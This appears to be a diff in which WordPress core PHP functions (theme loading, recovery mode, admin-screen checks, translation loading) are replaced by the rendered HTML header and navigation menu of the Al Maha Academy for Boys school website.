- * While upgrading or installing WordPress, no themes are returned.
- *
- * @since 5.1.0
- * @access private
- *
- * @global string $pagenow            The filename of the current screen.
- * @global string $wp_stylesheet_path Path to current theme's stylesheet directory.
- * @global string $wp_template_path   Path to current theme's template directory.
- *
- * @return string[] Array of absolute paths to theme directories.
- */
-function wp_get_active_and_valid_themes() {
-	global $pagenow, $wp_stylesheet_path, $wp_template_path;
-
-	$themes = array();
-
-	if ( wp_installing() && 'wp-activate.php' !== $pagenow ) {
-		return $themes;
-	}
-
-	if ( is_child_theme() ) {
-		$themes[] = $wp_stylesheet_path;
-	}
-
-	$themes[] = $wp_template_path;
-
-	/*
-	 * Remove themes from the list of active themes when we're on an endpoint
-	 * that should be protected against WSODs and the theme is paused.
-	 */
-	if ( wp_is_recovery_mode() ) {
-		$themes = wp_skip_paused_themes( $themes );
-
-		// If no active and valid themes exist, skip loading themes.
-		if ( empty( $themes ) ) {
-			add_filter( 'wp_using_themes', '__return_false' );
-		}
-	}
-
-	return $themes;
-}
-
-/**
- * Filters a given list of themes, removing any paused themes from it.
- *
- * @since 5.2.0
- *
- * @global WP_Paused_Extensions_Storage $_paused_themes
- *
- * @param string[] $themes Array of absolute theme directory paths.
- * @return string[] Filtered array of absolute paths to themes, without any paused themes.
- */
-function wp_skip_paused_themes( array $themes ) {
-	$paused_themes = wp_paused_themes()->get_all();
-
-	if ( empty( $paused_themes ) ) {
-		return $themes;
-	}
-
-	foreach ( $themes as $index => $theme ) {
-		$theme = basename( $theme );
-
-		if ( array_key_exists( $theme, $paused_themes ) ) {unset( $themes[ $index ] );
-
-			// Store list of paused themes for displaying an admin notice.
-			$GLOBALS['_paused_themes'][ $theme ] = $paused_themes[ $theme ];
-		}
-	}
-
-	return $themes;
-}
-
-/**
- * Determines whether WordPress is in Recovery Mode.
- *
- * In this mode, plugins or themes that cause WSODs will be paused.
- *
- * @since 5.2.0
- *
- * @return bool
- */
-function wp_is_recovery_mode() {
-	return wp_recovery_mode()->is_active();
-}
-
-/**
- * Determines whether we are currently on an endpoint that should be protected against WSODs.
- *
- * @since 5.2.0
- *
- * @global string $pagenow The filename of the current screen.
- *
- * @return bool True if the current endpoint should be protected.
- */
-function is_protected_endpoint() {// Protect login pages.
-	if ( isset( $GLOBALS['pagenow'] ) && 'wp-login.php' === $GLOBALS['pagenow'] ) {
-		return true;
-	}
-
-	// Protect the admin backend.
-	if ( is_admin() && ! wp_doing_ajax() ) {
-		return true;
-	}
-
-	// Protect Ajax actions that could help resolve a fatal error should be available.
-	if ( is_protected_ajax_action() ) {
-		return true;
-	}
-
-	/**
-	 * Filters whether the current request is against a protected endpoint.
-	 *
-	 * This filter is only fired when an endpoint is requested which is not already protected by
-	 * WordPress core. As such, it exclusively allows providing further protected endpoints in
-	 * addition to the admin backend, login pages and protected Ajax actions.
-	 *
-	 * @since 5.2.0
-	 *
-	 * @param bool $is_protected_endpoint Whether the currently requested endpoint is protected.
-	 *                                    Default false.
-	 */
-	return (bool) apply_filters( 'is_protected_endpoint', false );
-}
-
-/**
- * Determines whether we are currently handling an Ajax action that should be protected against WSODs.
- *
- * @since 5.2.0
- *
- * @return bool True if the current Ajax action should be protected.
- */
-function is_protected_ajax_action() {
-	if ( ! wp_doing_ajax() ) {
-		return false;
-	}
-
-	if ( ! isset( $_REQUEST['action'] ) ) {
-		return false;
-	}
-
-	$actions_to_protect = array(
-		'edit-theme-plugin-file', // Saving changes in the core code editor.
-		'heartbeat',              // Keep the heart beating.
-		'install-plugin',         // Installing a new plugin.
-		'install-theme',          // Installing a new theme.
-		'search-plugins',         // Searching in the list of plugins.
-		'search-install-plugins', // Searching for a plugin in the plugin install screen.
-		'update-plugin',          // Update an existing plugin.
-		'update-theme',           // Update an existing theme.
-		'activate-plugin',        // Activating an existing plugin.
-	);
-
-	/**
-	 * Filters the array of protected Ajax actions.
-	 *
-	 * This filter is only fired when doing Ajax and the Ajax request has an 'action' property.
-	 *
-	 * @since 5.2.0
-	 *
-	 * @param string[] $actions_to_protect Array of strings with Ajax actions to protect.
-	 */
-	$actions_to_protect = (array) apply_filters( 'wp_protected_ajax_actions', $actions_to_protect );
-
-	if ( ! in_array( $_REQUEST['action'], $actions_to_protect, true ) ) {
-		return false;
-	}
-
-	return true;
-}
-
-/**
- * Sets internal encoding.
- *
- * In most cases the default internal encoding is latin1, which is
- * of no use, since we want to use the `mb_` functions for `utf-8` strings.
- *
- * @since 3.0.0
- * @access private
- */
-function wp_set_internal_encoding() {
-	if ( function_exists( 'mb_internal_encoding' ) ) {
-		$charset = get_option( 'blog_charset' );
-		// phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged
-		if ( ! $charset || ! @mb_internal_encoding( $charset ) ) {
-			mb_internal_encoding( 'UTF-8' );
-		}
-	}
-}
-
-/**
- * Adds magic quotes to `$_GET`, `$_POST`, `$_COOKIE`, and `$_SERVER`.
- *
- * Also forces `$_REQUEST` to be `$_GET + $_POST`. If `$_SERVER`,
- * `$_COOKIE`, or `$_ENV` are needed, use those superglobals directly.
- *
- * @since 3.0.0
- * @access private
- */
-function wp_magic_quotes() {
-	// Escape with wpdb.
-	$_GET    = add_magic_quotes( $_GET );
-	$_POST   = add_magic_quotes( $_POST );
-	$_COOKIE = add_magic_quotes( $_COOKIE );
-	$_SERVER = add_magic_quotes( $_SERVER );
-
-	// Force REQUEST to be GET + POST.
-	$_REQUEST = array_merge( $_GET, $_POST );
-}
-
-/**
- * Runs just before PHP shuts down execution.
- *
- * @since 1.2.0
- * @access private
- */
-function shutdown_action_hook() {
-	/**
-	 * Fires just before PHP shuts down execution.
-	 *
-	 * @since 1.2.0
-	 */
-	do_action( 'shutdown' );
-
-	wp_cache_close();
-}
-
-/**
- * Clones an object.
- *
- * @since 2.7.0
- * @deprecated 3.2.0
- *
- * @param object $input_object The object to clone.
- * @return object The cloned object.
- */
-function wp_clone( $input_object ) {
-	// Use parens for clone to accommodate PHP 4. See #17880.
-	return clone( $input_object );
-}
-
-/**
- * Determines whether the current request is for the login screen.
- *
- * @since 6.1.0
- *
- * @see wp_login_url()
- *
- * @return bool True if inside WordPress login screen, false otherwise.
- */
-function is_login() {
-	return false !== stripos( wp_login_url(), $_SERVER['SCRIPT_NAME'] );
-}
-
-/**
- * Determines whether the current request is for an administrative interface page.
- *
- * Does not check if the user is an administrator; use current_user_can()
- * for checking roles and capabilities.
- *
- * For more information on this and similar theme functions, check out
- * the {@link https://developer.wordpress.org/themes/basics/conditional-tags/
- * Conditional Tags} article in the Theme Developer Handbook.
- *
- * @since 1.5.1
- *
- * @global WP_Screen $current_screen WordPress current screen object.
- *
- * @return bool True if inside WordPress administration interface, false otherwise.
- */
-function is_admin() {
-	if ( isset( $GLOBALS['current_screen'] ) ) {
-		return $GLOBALS['current_screen']->in_admin();
-	} elseif ( defined( 'WP_ADMIN' ) ) {
-		return WP_ADMIN;
-	}
-
-	return false;
-}
-
-/**
- * Determines whether the current request is for a site's administrative interface.
- *
- * e.g. `/wp-admin/`
- *
- * Does not check if the user is an administrator; use current_user_can()
- * for checking roles and capabilities.
- *
- * @since 3.1.0
- *
- * @global WP_Screen $current_screen WordPress current screen object.
- *
- * @return bool True if inside WordPress site administration pages.
- */
-function is_blog_admin() {
-	if ( isset( $GLOBALS['current_screen'] ) ) {
-		return $GLOBALS['current_screen']->in_admin( 'site' );
-	} elseif ( defined( 'WP_BLOG_ADMIN' ) ) {
-		return WP_BLOG_ADMIN;
-	}
-
-	return false;
-}
-
-/**
- * Determines whether the current request is for the network administrative interface.
- *
- * e.g. `/wp-admin/network/`
- *
- * Does not check if the user is an administrator; use current_user_can()
- * for checking roles and capabilities.
- *
- * Does not check if the site is a Multisite network; use is_multisite()
- * for checking if Multisite is enabled.
- *
- * @since 3.1.0
- *
- * @global WP_Screen $current_screen WordPress current screen object.
- *
- * @return bool True if inside WordPress network administration pages.
- */
-function is_network_admin() {
-	if ( isset( $GLOBALS['current_screen'] ) ) {
-		return $GLOBALS['current_screen']->in_admin( 'network' );
-	} elseif ( defined( 'WP_NETWORK_ADMIN' ) ) {
-		return WP_NETWORK_ADMIN;
-	}
-
-	return false;
-}
-
-/**
- * Determines whether the current request is for a user admin screen.
- *
- * e.g. `/wp-admin/user/`
- *
- * Does not check if the user is an administrator; use current_user_can()
- * for checking roles and capabilities.
- *
- * @since 3.1.0
- *
- * @global WP_Screen $current_screen WordPress current screen object.
- *
- * @return bool True if inside WordPress user administration pages.
- */
-function is_user_admin() {
-	if ( isset( $GLOBALS['current_screen'] ) ) {
-		return $GLOBALS['current_screen']->in_admin( 'user' );
-	} elseif ( defined( 'WP_USER_ADMIN' ) ) {
-		return WP_USER_ADMIN;
-	}
-
-	return false;
-}
-
-/**
- * Determines whether Multisite is enabled.
- *
- * @since 3.0.0
- *
- * @return bool True if Multisite is enabled, false otherwise.
- */
-function is_multisite() {
-	if ( defined( 'MULTISITE' ) ) {
-		return MULTISITE;
-	}
-
-	if ( defined( 'SUBDOMAIN_INSTALL' ) || defined( 'VHOST' ) || defined( 'SUNRISE' ) ) {
-		return true;
-	}
-
-	return false;
-}
-
-/**
- * Converts a value to non-negative integer.
- *
- * @since 2.5.0
- *
- * @param mixed $maybeint Data you wish to have converted to a non-negative integer.
- * @return int A non-negative integer.
- */
-function absint( $maybeint ) {
-	return abs( (int) $maybeint );
-}
-
-/**
- * Retrieves the current site ID.
- *
- * @since 3.1.0
- *
- * @global int $blog_id
- *
- * @return int Site ID.
- */
-function get_current_blog_id() {
-	global $blog_id;
-
-	return absint( $blog_id );
-}
-
-/**
- * Retrieves the current network ID.
- *
- * @since 4.6.0
- *
- * @return int The ID of the current network.
- */
-function get_current_network_id() {
-	if ( ! is_multisite() ) {
-		return 1;
-	}
-
-	$current_network = get_network();
-
-	if ( ! isset( $current_network->id ) ) {
-		return get_main_network_id();
-	}
-
-	return absint( $current_network->id );
-}
-
-/**
- * Attempts an early load of translations.
- *
- * Used for errors encountered during the initial loading process, before
- * the locale has been properly detected and loaded.
- *
- * Designed for unusual load sequences (like setup-config.php) or for when
- * the script will then terminate with an error, otherwise there is a risk
- * that a file can be double-included.
- *
- * @since 3.4.0
- * @access private
- *
- * @global WP_Textdomain_Registry $wp_textdomain_registry WordPress Textdomain Registry.
- * @global WP_Locale              $wp_locale              WordPress date and time locale object.
- */
-function wp_load_translations_early() {
-	global $wp_textdomain_registry, $wp_locale;
-	static $loaded = false;
-
-	if ( $loaded ) {
-		return;
-	}
-
-	$loaded = true;
-
-	if ( function_exists( 'did_action' ) && did_action( 'init' ) ) {
-		return;
-	}
-
-	// We need $wp_local_package.
-	require ABSPATH . WPINC . '/version.php';
-
-	// Translation and localization.
-	require_once ABSPATH . WPINC . '/pomo/mo.php';
-	require_once ABSPATH . WPINC . '/l10n/class-wp-translation-controller.php';
-	require_once ABSPATH . WPINC . '/l10n/class-wp-translations.php';
-	require_once ABSPATH . WPINC . '/l10n/class-wp-translation-file.php';
-	require_once ABSPATH . WPINC . '/l10n/class-wp-translation-file-mo.php';
-	require_once ABSPATH . WPINC . '/l10n/class-wp-translation-file-php.php';
-	require_once ABSPATH . WPINC . '/l10n.php';
-	require_once ABSPATH . WPINC . '/class-wp-textdomain-registry.php';
-	require_once ABSPATH . WPINC . '/class-wp-locale.php';
-	require_once ABSPATH . WPINC . '/class-wp-locale-switcher.php';
-
-	// General libraries.
-	require_once ABSPATH . WPINC . '/plugin.php';
-
-	$locales   = array();
-	$locations = array();
-
-	if ( ! $wp_textdomain_registry instanceof WP_Textdomain_Registry ) {
-		$wp_textdomain_registry = new WP_Textdomain_Registry();
-	}
-
-	while ( true ) {
-		if ( defined( 'WPLANG' ) ) {
-			if ( '' === WPLANG ) {
-				break;
-			}
-			$locales[] = WPLANG;
-		}
-
-		if ( isset( $wp_local_package ) ) {
-			$locales[] = $wp_local_package;
-		}
-
-		if ( ! $locales ) {
-			break;
-		}
-
-		if ( defined( 'WP_LANG_DIR' ) && @is_dir( WP_LANG_DIR ) ) {
-			$locations[] = WP_LANG_DIR;
-		}
-
-		if ( defined( 'WP_CONTENT_DIR' ) && @is_dir( WP_CONTENT_DIR . '/languages' ) ) {
-			$locations[] = WP_CONTENT_DIR . '/languages';
-		}
-
-		if ( @is_dir( ABSPATH . 'wp-content/languages' ) ) {
-			$locations[] = ABSPATH . 'wp-content/languages';
-		}
-
-		if ( @is_dir( ABSPATH . WPINC . '/languages' ) ) {
-			$locations[] = ABSPATH . WPINC . '/languages';
-		}
-
-		if ( ! $locations ) {
-			break;
-		}
-
-		$locations = array_unique( $locations );
-
-		foreach ( $locales as $locale ) {
-			foreach ( $locations as $location ) {
-				if ( file_exists( $location . '/' . $locale . '.mo' ) ) {
-					load_textdomain( 'default', $location . '/' . $locale . '.mo', $locale );
-
-					if ( defined( 'WP_SETUP_CONFIG' ) && file_exists( $location . '/admin-' . $locale . '.mo' ) ) {
-						load_textdomain( 'default', $location . '/admin-' . $locale . '.mo', $locale );
+				@media screen and (max-height: 1024px) {
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
 					}
-
-					break 2;
 				}
-			}
-		}
+				@media screen and (max-height: 640px) {
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+			</style>
+			<link rel="icon" href="https://amab.com.qa/wp-content/uploads/2020/02/cropped-amag-white-150x150.png" sizes="32x32" />
+<link rel="icon" href="https://amab.com.qa/wp-content/uploads/2020/02/cropped-amag-white-300x300.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://amab.com.qa/wp-content/uploads/2020/02/cropped-amag-white-300x300.png" />
+<meta name="msapplication-TileImage" content="https://amab.com.qa/wp-content/uploads/2020/02/cropped-amag-white-300x300.png" />
+</head>
+<body class="page-template page-template-elementor_theme page page-id-992016 wp-custom-logo wp-embed-responsive translatepress-en_US full header-layout-logo-menu has-page-header no-middle-header responsive-layout vamtam-is-elementor elementor-active elementor-pro-active vamtam-wc-cart-empty wc-product-gallery-zoom-active wc-product-gallery-slider-active layout-full elementor-default elementor-kit-9 elementor-page elementor-page-992016">
+	<div id="top"></div>
+			<e-page-transition preloader-type="image" preloader-image-url="http://innovatixsys.com/amab/wp-content/uploads/2024/11/Boys-.png" class="e-page-transition--entering" exclude="^https\:\/\/amab\.com\.qa\/wp\-admin\/">
+					</e-page-transition>
+		
+			<div data-elementor-type="header" data-elementor-id="9088" class="elementor elementor-9088 elementor-location-header" data-elementor-post-type="elementor_library">
+					<section class="elementor-section elementor-top-section elementor-element elementor-element-0911753 elementor-section-full_width vamtam-sticky-header vamtam-sticky-header--transparent-header  elementor-hidden-tablet elementor-hidden-mobile elementor-section-height-min-height elementor-section-items-stretch elementor-section-content-middle animated-fast elementor-section-height-default" data-id="0911753" data-element_type="section" data-settings="{&quot;sticky&quot;:&quot;top&quot;,&quot;sticky_on&quot;:[&quot;desktop&quot;],&quot;animation&quot;:&quot;none&quot;,&quot;animation_delay&quot;:800,&quot;sticky_offset&quot;:0,&quot;sticky_effects_offset&quot;:0}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-bbf3353 elementor-hidden-mobile" data-id="bbf3353" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-d5405ac elementor-hidden-mobile elementor-widget elementor-widget-theme-site-logo elementor-widget-image" data-id="d5405ac" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;none&quot;}" data-widget_type="theme-site-logo.default">
+				<div class="elementor-widget-container">
+											<a href="https://amab.com.qa">
+			<img fetchpriority="high" width="2800" height="1000" src="https://amab.com.qa/wp-content/uploads/2020/02/main-1.png" class="attachment-full size-full wp-image-987694" alt="main logo" srcset="https://amab.com.qa/wp-content/uploads/2020/02/main-1.png 2800w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-300x107.png 300w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-1024x366.png 1024w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-768x274.png 768w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-1536x549.png 1536w, https://amab.com.qa/wp-content/uploads/2020/02/main-1-2048x731.png 2048w" sizes="(max-width: 2800px) 100vw, 2800px" />				</a>
+											</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-6d12980 animated-fast elementor-hidden-mobile" data-id="6d12980" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;none&quot;,&quot;animation_delay&quot;:1000}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-828f307 elementor-widget__width-auto elementor-widget-tablet__width-initial elementor-hidden-tablet elementor-hidden-mobile elementor-nav-menu--dropdown-tablet elementor-nav-menu__text-align-aside elementor-nav-menu--toggle elementor-nav-menu--burger vamtam-has-mobile-disable-scroll elementor-widget elementor-widget-nav-menu" data-id="828f307" data-element_type="widget" data-settings="{&quot;submenu_icon&quot;:{&quot;value&quot;:&quot;&lt;i class=\&quot;\&quot;&gt;&lt;\/i&gt;&quot;,&quot;library&quot;:&quot;&quot;},&quot;layout&quot;:&quot;horizontal&quot;,&quot;toggle&quot;:&quot;burger&quot;,&quot;toggle_icon_active&quot;:{&quot;value&quot;:&quot;&quot;,&quot;library&quot;:&quot;&quot;}}" data-widget_type="nav-menu.default">
+				<div class="elementor-widget-container">
+								<nav class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-horizontal e--pointer-background e--animation-fade">
+				<ul id="menu-1-828f307" class="elementor-nav-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-987659"><a href="https://amab.com.qa/" class="elementor-item">Home</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988401"><a href="#" class="elementor-item elementor-item-anchor">About</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-987967"><a href="https://amab.com.qa/welcome-to-al-maha-academy-for-boys/" class="elementor-sub-item">Welcome to Al Maha Academy for Boys</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-990755"><a href="https://amab.com.qa/principals-message/" class="elementor-sub-item">Principal’s Message</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-987984"><a href="https://amab.com.qa/mission-and-vision/" class="elementor-sub-item">Mission &#038; Vision</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-992965"><a href="https://amab.com.qa/governance/" class="elementor-sub-item">Governance</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988042"><a href="https://amab.com.qa/code-of-ethics/" class="elementor-sub-item">Code of Ethics</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988008"><a href="https://amab.com.qa/school-policies/" class="elementor-sub-item">School Policies</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993917"><a target="_blank" href="/wp-content/uploads/2025/04/Taallum-Curriculum_Arabic-Medium-Subjects_Ara-Eng-V.pdf" class="elementor-sub-item">Arabic Medium Subjects Curriculum</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988052"><a href="https://amab.com.qa/knowledge-centre/" class="elementor-sub-item">Learning Support Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988081"><a href="https://amab.com.qa/parents-committee/" class="elementor-sub-item">Parent’s Committee Council</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988108"><a href="https://amab.com.qa/careers/" class="elementor-sub-item">Careers</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988114"><a href="https://amab.com.qa/contact-us/" class="elementor-sub-item">Contact Us</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988126"><a href="#" class="elementor-item elementor-item-anchor">Infant</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988155"><a href="https://amab.com.qa/welcome-to-infant-school/" class="elementor-sub-item">Welcome to Infant School</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-994093"><a href="https://amab.com.qa/infant-school-document-centre-25-26/" class="elementor-sub-item">Document Centre 25-26</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-993915"><a href="https://amab.com.qa/infant-school-curriculum-and-assessments/" class="elementor-sub-item">Infant School Curriculum &#038; Assessments</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988175"><a href="https://amab.com.qa/infant-school-arabic-department/" class="elementor-sub-item">Infant School Arabic Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988192"><a href="https://amab.com.qa/infant-school-gallery/" class="elementor-sub-item">Infant School Gallery</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988166"><a href="https://play.numbots.com/#/account/school-login/107035" class="elementor-sub-item elementor-item-anchor">Numbots Site</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988207"><a href="https://amab.com.qa/infant-school-new-uniform/" class="elementor-sub-item">New Uniform</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988127"><a href="#" class="elementor-item elementor-item-anchor">Junior</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988248"><a href="https://amab.com.qa/welcome-to-junior-school/" class="elementor-sub-item">Welcome to Junior School</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988259"><a href="https://amab.com.qa/junior-school-curriculum-and-assessments/" class="elementor-sub-item">Junior School Curriculum &#038; Assessments</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988317"><a href="https://amab.com.qa/junior-school-document-centre/" class="elementor-sub-item">Junior School Document Centre</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988295"><a href="https://amab.com.qa/junior-school-arabic-department/" class="elementor-sub-item">Junior School Arabic Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988294"><a href="https://amab.com.qa/junior-school-student-council/" class="elementor-sub-item">Junior School Student Council</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988323"><a href="https://amab.com.qa/junior-school-gallery/" class="elementor-sub-item">Junior School Gallery</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988128"><a href="#" class="elementor-item elementor-item-anchor">Secondary</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-989363"><a href="https://amab.com.qa/welcome-to-secondary-school-2/" class="elementor-sub-item">Welcome to Secondary School</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988362"><a href="https://amab.com.qa/secondary-school-curriculum-and-assessments/" class="elementor-sub-item">Secondary School Curriculum &#038; Assessments</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988626"><a href="https://amab.com.qa/secondary-school-document-centre/" class="elementor-sub-item">Secondary School Document Centre</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988534"><a href="https://amab.com.qa/secondary-school-arabic-department/" class="elementor-sub-item">Secondary School Arabic Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988563"><a href="https://amab.com.qa/secondary-house-system/" class="elementor-sub-item">Secondary House System</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988639"><a href="https://amab.com.qa/secondary-school-gallery/" class="elementor-sub-item">Secondary School Gallery</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988653"><a href="#" class="elementor-item elementor-item-anchor">Admissions</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988652"><a href="https://amab.com.qa/registrars-message/" class="elementor-sub-item">Registrar’s Office</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988664"><a href="https://amab.com.qa/online-admission/" class="elementor-sub-item">Online Admission</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988667"><a href="https://amab.com.qa/registration-documentation/" class="elementor-sub-item">Registration Documentation</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994016"><a href="http://amab.com.qa/wp-content/uploads/2025/09/AMAB-Arabic-أكاديمية-المها-للبنين-سياسة-الرسوم-2025-2026-Copy.pdf" class="elementor-sub-item">MoE Approved School Tuition Fees 2025-2026 ( Arabic)</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994111"><a href="http://amab.com.qa/wp-content/uploads/2025/09/AMAB-Fees-Policy-Updated-for-2025-2026-English.pdf" class="elementor-sub-item">School Tuition Fees Policy 2025-2026 (English))</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994113"><a href="http://amab.com.qa/wp-content/uploads/2025/09/AMAB-MOE-Fee-Policy-and-MOE-Tablet-Mandatory-Letter-for-AY-2025-2026-2.pdf" class="elementor-sub-item">MoE Approved School Tuition Fees 2025-2026 (English))</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-988720"><a target="_blank" href="/wp-content/uploads/2024/10/MOE-AMAB-Fee-Policy-2022-2023.pdf#new_tab" class="elementor-sub-item elementor-item-anchor">MOE Fee Policy AMAB – 2024-2025</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993416"><a href="/wp-content/uploads/2024/10/Re-Enrollment-letter-2024-2025.pdf" class="elementor-sub-item">Student Re-enrollment 2024-2025</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-993999"><a href="https://amab.com.qa/academic-calendar/" class="elementor-sub-item">Academic Calendar</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-988727"><a target="_blank" href="/wp-content/uploads/2024/10/2020.5.4-Withdrawal-Procedures-AMAB.pdf#new_tab" class="elementor-sub-item elementor-item-anchor">Withdrawal Procedures</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988728"><a href="#" class="elementor-item elementor-item-anchor">Examinations</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994151"><a href="http://amab.com.qa/wp-content/uploads/2025/10/Taallum-Mock-Session-1b-Y12-2025-V2.pdf" class="elementor-sub-item">Year 12 IAL and AS Mock Examination 1b Timetable</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994149"><a href="https://taallum-my.sharepoint.com/:f:/g/personal/lessons_amab_taalumgroup_com/EvUirKJiSQBOq_jkubsj-a4BorvtcNUlYwjOgK9E0B-Aeg?e=xp2N4T" class="elementor-sub-item">Year 12 Mock 1 LOs and Self-Instructional Materials</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994141"><a href="http://amab.com.qa/wp-content/uploads/2025/09/Mid-Semester-1-Exam-Timetable-V6.pdf" class="elementor-sub-item">Mid Semester 1 : 25-26 Timetable</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994140"><a href="https://taallum-my.sharepoint.com/:f:/g/personal/lessons_amab_taalumgroup_com/EoV8WoBylZtPqJqTTRGQF_oBhkwuYZIVrwudlGcpTs-pzg?e=bCpTQb" class="elementor-sub-item">Mid Semester 1: LO&#8217;s &#038; Self-Instruction Materials</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988827"><a target="_blank" href="http://amab.com.qa/wp-content/uploads/2025/09/Appendix-1A_Taallum-Assessment-Model-Mark-Distribution.pdf" class="elementor-sub-item">Appendix 1A_Ta&#8217;allum Assessment Model &#038; Mark Distribution</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993839"><a href="http://amab.com.qa/wp-content/uploads/2025/03/AMAB-IGCSE-IAS-Summer-2025-Timetable-STUDENTS-10-11-12.pdf" class="elementor-sub-item">Summer IGCSE/AS exams timetable June 2025</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988816"><a href="https://amab.com.qa/external-exam-information/" class="elementor-sub-item">External Exam Information</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988824"><a target="_blank" href="/wp-content/uploads/2024/10/Infant-School-Assessment-Model-EYFS-Nursery-Reception.pdf" class="elementor-sub-item">Infant School Assessment (Nursery &#8211; Reception ) Model  2024-2025</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988825"><a target="_blank" href="/wp-content/uploads/2024/10/Upper-Infant-Junior-Assessment-Model-Years-1-6-.pdf" class="elementor-sub-item">Upper-Infant-Junior Assessment-Model ( Year 1-6)</a></li>
